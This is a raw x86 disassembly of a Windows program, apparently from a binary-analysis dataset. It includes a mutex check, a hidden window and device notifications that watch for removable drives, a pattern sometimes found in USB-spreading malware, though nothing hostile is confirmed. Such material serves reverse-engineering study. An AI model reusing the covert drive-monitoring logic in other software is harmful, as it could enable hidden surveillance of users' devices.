mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_406a05
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_4069c0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_406ab5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_406ad4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_406aac
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_406ab5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_406ad7
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_406bd0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_406c70
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_406c9b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_4023eb
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_406d94
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_405bde
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_406d60
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_406d94
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4023eb
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_406dd0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_406e20
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_406e60
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_4023eb
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_40515f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_406d94
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_406c9b
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_405ab1
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_406f75
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_406e60
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_406fb0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_407018
push ebp
mov ebp esp
sub esp 0x418
mov eax 0x105
push eax
lea ecx [ ebp - 0x418 ]
push ecx
xor ecx ecx
push ecx
push ecx
push ecx
push eax
lea eax [ ebp - 0x20c ]
push eax
push [ ebp + 0x8 ]
call [ GetVolumeInformationW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
setne al
leave
retn
xor al al
leave
retn
sub_407092
push esi
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0x8 ]
push 0x0
push 0x1f0001
call [ OpenMutexW@IAT ]
mov esi eax
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
xor al al
pop esi
retn
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
sub_4070c5
push esi
mov esi eax
imul esi esi 0xa0
cmp [ esi + rw-data ] 0x0
push edi
jne r-xdata
pop edi
pop esi
retn
cmp [ esi + rw-data ] 0x0
je r-xdata
lea eax [ esi + rw-data ]
push eax
call sub_407083
pop ecx
push [ esi + rw-data ]
mov [ esi + rw-data ] eax
call [ CloseHandle@IAT ]
push [ esi + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
sub_40710f
mov eax [ edi + 0x4 ]
dec eax
dec eax
push esi
je r-xdata
xor esi esi
sub eax 0x4
jne r-xdata
inc esi
cmp esi 0x1a
jl r-xdata
mov eax esi
call sub_4070c5
pop esi
retn
push ebx
xor ebx ebx
mov esi rw-data
mov eax [ edi + 0xc ]
mov ecx esi
shr eax cl
test al 0x1
je r-xdata
add esi 0xa0
inc ebx
cmp esi rw-data
jl r-xdata
mov eax ebx
call sub_4070c5
mov eax [ edi + 0xc ]
cmp eax [ esi ]
jne r-xdata
pop ebx
pop esi
retn
sub_407160
push ecx
call sub_40f29b
push rw-data
push r--data
call sub_401961
call sub_40f29b
push rw-data
push r--data
call sub_401961
call sub_40f29b
push rw-data
push r--data
call sub_401961
pop ecx
retn
sub_40719f
mov eax sub_41afd1
call sub_416a8c
sub esp 0x48
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40eb63
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
mov [ ebp + 0x8 ] edi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x14 ] eax
mov esi eax
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x14 ] eax
mov esi eax
call sub_40c9fb
mov [ ebp - 0x4 ] 0x3
lea esi [ ebp - 0x24 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x4
mov ebx edi
imul ebx ebx 0xa0
lea esi [ ebx + rw-data ]
mov [ ebp - 0x50 ] esi
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
call sub_40f29b
call sub_40e9bf
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x5
test edi edi
jns r-xdata
call sub_407065
lea eax [ ebx + rw-data ]
push eax
call sub_407083
pop ecx
mov [ ebx + rw-data ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x54 ]
call sub_401e93
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp edi 0x1a
jl r-xdata
imul edi edi 0xa0
lea esi [ edi + rw-data ]
call sub_407065
lea esi [ edi + rw-data ]
call sub_407065
push [ edi + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
mov [ ebp - 0x4 ] 0xe
lea esi [ ebp - 0x24 ]
call sub_40c938
mov [ ebp - 0x4 ] 0xd
lea eax [ ebp - 0x3c ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xd
mov esi eax
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x4c ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
xor edi edi
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
lea esi [ ebp - 0x24 ]
call sub_40c938
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x3c ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
mov esi eax
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x4c ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xa
xor edi edi
inc edi
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x4c ]
call sub_40c938
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4072bb
mov edi [ ebp + 0x8 ]
imul edi edi 0xa0
lea esi [ edi + rw-data ]
call sub_407065
lea esi [ edi + rw-data ]
call sub_407065
push [ edi + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
mov [ ebp - 0x4 ] 0xe
lea esi [ ebp - 0x24 ]
call sub_40c938
mov [ ebp - 0x4 ] 0xd
lea eax [ ebp - 0x3c ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xd
mov esi eax
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x4c ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
xor edi edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x4c ]
call sub_40c938
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_407322
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x0
lea eax [ ebp + 0x8 ]
push eax
push sub_40719f
push 0x10000
push 0x0
call [ CreateThread@IAT ]
test eax eax
je r-xdata
leave
retn
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_407354
push ebp
mov ebp esp
sub esp 0x44
mov eax [ r--data ]
push esi
push edi
mov [ ebp - 0x10 ] eax
mov eax [ r--data ]
mov [ ebp - 0xc ] eax
xor eax eax
lea edi [ ebp - 0x8 ]
stosd [ edi ]
stosd [ edi ]
push 0xc
pop ecx
mov esi r--data
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor edi edi
inc edi
cmp edi 0x18
jb r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_407018
pop ecx
test al al
je r-xdata
movzx esi [ ebp + edi * 2 - 0x44 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] si
call [ GetDriveTypeW@IAT ]
cmp eax 0x2
jne r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ esi - 0x41 ]
imul eax eax 0xa0
lea eax [ eax + rw-data ]
push eax
call [ lstrcpyW@IAT ]
sub esi 0x42
push esi
call sub_407322
pop ecx
sub_4073d8
push ebp
mov ebp esp
sub esp 0x34
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi ebx
imul edi edi 0xa0
lea esi [ edi + rw-data ]
call sub_407065
and [ esi ] 0x0
lea esi [ edi + rw-data ]
call sub_407065
and [ esi ] 0x0
mov esi r--data
push esi
lea eax [ edi + rw-data ]
add ebx 0x41
push eax
movzx ebx bx
call [ lstrcpyW@IAT ]
push esi
call [ lstrlenW@IAT ]
mov esi [ ebp + 0xc ]
imul esi esi 0x50
mov [ ebp - 0x4 ] 0x40
sub [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
add esi eax
add esi esi
lea eax [ esi + rw-data ]
push r--data
push eax
mov [ ebp - 0x8 ] eax
call [ lstrcpynW@IAT ]
mov eax [ ebp - 0x8 ]
mov [ eax ] bx
lea eax [ edi + rw-data ]
push r--data
push eax
mov [ ebp - 0x8 ] eax
call [ lstrcpyW@IAT ]
push [ ebp - 0x4 ]
push r--data
push [ ebp - 0x8 ]
call [ lstrcpynW@IAT ]
mov [ esi + rw-data ] bx
push r--data
lea esi [ edi + rw-data ]
push esi
call [ lstrcpyW@IAT ]
push [ ebp - 0x8 ]
mov [ esi ] bx
call sub_407092
pop ecx
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push 0x2000000
push 0x3
push 0x0
push 0x7
push 0x80000000
push esi
call [ CreateFileW@IAT ]
push 0x2c
pop ebx
mov esi eax
push ebx
lea eax [ ebp - 0x34 ]
push 0x0
push eax
mov [ edi + rw-data ] esi
call sub_405830
add esp 0xc
push 0x0
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] 0x6
mov [ ebp - 0x28 ] esi
call [ RegisterDeviceNotificationW@IAT ]
push [ ebp + 0xc ]
mov [ edi + rw-data ] eax
call sub_407322
pop ecx
sub_40750c
cmp [ esi + 0x4 ] 0x2
jne r-xdata
retn
push edi
xor edi edi
inc edi
cmp edi 0x1a
jl r-xdata
push edi
push [ esp + 0xc ]
call sub_4073d8
pop ecx
pop ecx
mov eax [ esi + 0xc ]
mov ecx edi
shr eax cl
test al 0x1
je r-xdata
pop edi
sub_407534
sub eax 0x8000
push edi
mov edi ecx
je r-xdata
push esi
push [ esp + 0xc ]
mov esi edi
call sub_40750c
pop ecx
pop esi
dec eax
je r-xdata
call sub_40710f
pop edi
retn
sub eax 0x3
jne r-xdata
pop edi
retn
sub_40755d
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x10
je r-xdata
push esi
push [ rw-data ]
call [ UnregisterDeviceNotification@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
xor esi esi
dec eax
dec eax
je r-xdata
mov eax esi
call sub_4070c5
inc esi
cmp esi 0x1a
jl r-xdata
pop esi
push 0x0
call [ PostQuitMessage@IAT ]
jmp r-xdata
sub eax 0x207
jne r-xdata
pop ebp
jmp [ DefWindowProcW@IAT ]
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call sub_407534
pop ecx
jmp r-xdata
sub_4075be
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
push 0x30
pop ebx
push ebx
mov edi eax
xor esi esi
lea eax [ ebp - 0x50 ]
push esi
push eax
call sub_405830
mov eax [ edi + 0x5768 ]
mov [ ebp - 0x3c ] eax
add esp 0xc
mov [ ebp - 0x50 ] ebx
lea eax [ ebp - 0x50 ]
mov ebx r--data
push eax
mov [ ebp - 0x4c ] 0x4000
mov [ ebp - 0x48 ] sub_40755d
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] r--data
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] esi
call [ RegisterClassExW@IAT ]
mov edi [ edi + 0x5768 ]
push esi
push edi
push esi
push esi
mov eax 0xc8
push eax
push eax
push esi
push esi
mov edi 0x2000000
push edi
push r--data
push ebx
push esi
call [ CreateWindowExW@IAT ]
push edi
mov edi [ SetWindowLongW@IAT ]
push 0xfffffff0
push eax
mov [ rw-data ] eax
call edi
push 0x8000000
push 0xffffffec
push [ rw-data ]
call edi
push esi
push [ rw-data ]
call [ ShowWindow@IAT ]
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0x20 ]
[ edi ]
push 0x10
lea eax [ ebp - 0x14 ]
push r--data
push eax
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x1c ] 0x5
call sub_401f50
add esp 0xc
push esi
lea eax [ ebp - 0x20 ]
push eax
push [ rw-data ]
call [ RegisterDeviceNotificationW@IAT ]
cmp eax esi
mov [ rw-data ] eax
setne al
pop edi
pop esi
pop ebx
leave
retn
sub_4076bf
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41b00d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
lea esi [ esp + 0x10 ]
call sub_40c9fb
xor ebx ebx
mov [ esp + 0x6c ] ebx
lea eax [ esp + 0x3c ]
push eax
call sub_412634
mov [ esp + 0x6c ] 0x1
call sub_407160
push 0x10e0
push ebx
push rw-data
call sub_405830
mov eax [ ebp + 0x8 ]
add esp 0xc
call sub_4075be
test al al
je r-xdata
mov [ esp + 0x6c ] bl
lea eax [ esp + 0x3c ]
push eax
call sub_4125f1
or [ esp + 0x6c ] 0xffffffff
lea esi [ esp + 0x10 ]
call sub_40c938
mov ecx [ esp + 0x64 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
call sub_407354
mov edi [ PeekMessageW@IAT ]
mov esi [ Sleep@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ esp + 0x30 ]
push eax
call edi
test eax eax
je r-xdata
push 0xa
call esi
push ebx
call esi
push ebx
push ebx
push ebx
lea eax [ esp + 0x2c ]
push eax
call [ GetMessageW@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
push eax
call [ DispatchMessageW@IAT ]
jmp r-xdata
sub_40779a
push ebp
mov ebp esp
sub esp 0x10
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ UuidCreate@IAT ]
xor eax eax
mov [ esi ] ax
movzx eax [ ebp - 0x1 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
movzx eax [ ebp - 0x3 ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x7 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push r--data
push esi
call [ wsprintfW@IAT ]
add esp 0x34
mov al 0x1
leave
retn
xor al al
leave
retn
sub_4077ff
push ebp
mov ebp esp
sub esp 0x5c
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x10 ] 0x2
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] ebx
jg r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx ebx
je r-xdata
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x48
pop edx
lea eax [ ebp - 0x58 ]
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
mov eax [ ecx ]
push ebx
lea edx [ ebp - 0x58 ]
push edx
push ecx
call [ eax + 0x30 ]
cmp [ ebp - 0x50 ] 0x3
jbe r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax 0x400
cmp [ ebp - 0x50 ] eax
jb r-xdata
mov edi [ ebp - 0x50 ]
xor esi esi
mov [ ebp - 0x8 ] ebx
cmp edi ebx
jbe r-xdata
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x10 ] ebx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edi
add edx esi
push edx
push eax
call [ ecx + 0xc ]
cmp eax 0x1
jne r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp eax 0x8000000a
jne r-xdata
add esi [ ebp - 0x8 ]
sub edi [ ebp - 0x8 ]
jmp r-xdata
cmp esi [ ebp - 0x50 ]
jb r-xdata
cmp esi [ ebp - 0x50 ]
jb r-xdata
sub_4078cf
push ebp
mov ebp esp
mov eax 0xd40c
call sub_406c70
push esi
push edi
test ebx ebx
je r-xdata
xor al al
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebx + 0x94 ]
mov [ ebp - 0x8 ] eax
mov ecx 0x8000
lea eax [ ebp - 0xd40c ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xd40c ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0xd40c ]
push eax
call esi
push [ rw-data ]
mov edi [ wsprintfW@IAT ]
lea eax [ ebp - 0x540c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x540c ]
push eax
lea eax [ ebp - 0xd40c ]
push eax
call esi
push [ rw-data ]
lea eax [ ebp - 0x540c ]
push [ rw-data ]
push r--data
push eax
call edi
add esp 0x10
lea eax [ ebp - 0x540c ]
push eax
lea eax [ ebp - 0xd40c ]
push eax
call esi
push 0x3
lea eax [ ebp - 0x540c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x540c ]
push eax
lea eax [ ebp - 0xd40c ]
push eax
call esi
lea eax [ ebx + 0xc ]
push eax
lea eax [ ebp - 0x540c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x540c ]
push eax
lea eax [ ebp - 0xd40c ]
push eax
call esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x540c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x540c ]
push eax
lea eax [ ebp - 0xd40c ]
push eax
call esi
push r--data
lea eax [ ebp - 0xd40c ]
push eax
call esi
mov ecx 0x1000
lea eax [ ebp - 0x140c ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x8c ]
mov edx [ ebx + 0x8 ]
mov ecx eax
imul ecx [ ebp - 0x8 ]
sub edx ecx
cmp eax edx
jl r-xdata
mov edx [ ebx + 0x4 ]
add edx ecx
lea ecx [ ebp - 0x140c ]
call sub_41033b
mov edi [ lstrlenA@IAT ]
lea eax [ ebp - 0x140c ]
push eax
call edi
mov ecx 0xfff
cmp eax ecx
jae r-xdata
mov eax edx
mov [ ebp - 0x8 ] ecx
